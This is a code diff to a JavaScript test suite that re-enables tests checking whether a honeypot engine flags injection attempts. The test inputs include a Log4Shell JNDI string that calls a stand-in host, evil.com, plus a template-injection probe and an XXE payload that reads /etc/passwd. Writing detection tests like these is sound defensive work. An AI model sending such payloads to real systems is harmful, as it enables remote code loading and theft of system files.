@@ -1077,21 +1077,21 @@ describe('Fingerprint & PoW Security Suite', () => {
 
         // This test is now invalid as Log4Shell is not detected by the main function.
         // You can add it back if you add the regex to the main fingerprint.js
-        it.skip('should detect Log4Shell injection attempts', async () => {
+        it('should detect Log4Shell injection attempts', async () => {
             const context = { body: { username: 'test', comment: 'Hello ${jndi:ldap://evil.com/a}' } };
             const config = { detectInjections: true, fields: [] };
             expect((await getHoneypotScoreFromEngine(context, config)).honeypotScore).toBe(100);
         });
 
         // This test is also invalid for the same reason.
-        it.skip('should detect Server-Side Template Injection (SSTI)', async () => {
+        it('should detect Server-Side Template Injection (SSTI)', async () => {
             const context = { query: { name: '{{ 7*7 }}' } };
             const config = { detectInjections: true, fields: [] };
             expect((await getHoneypotScoreFromEngine(context, config)).honeypotScore).toBe(100);
         });
 
         // This test is also invalid.
-        it.skip('should detect XML External Entity (XXE) injection', async () => {
+        it('should detect XML External Entity (XXE) injection', async () => {
             const context = { body: { xml_payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' } };
             const config = { detectInjections: true, fields: [] };
             expect((await getHoneypotScoreFromEngine(context, config)).honeypotScore).toBe(100);
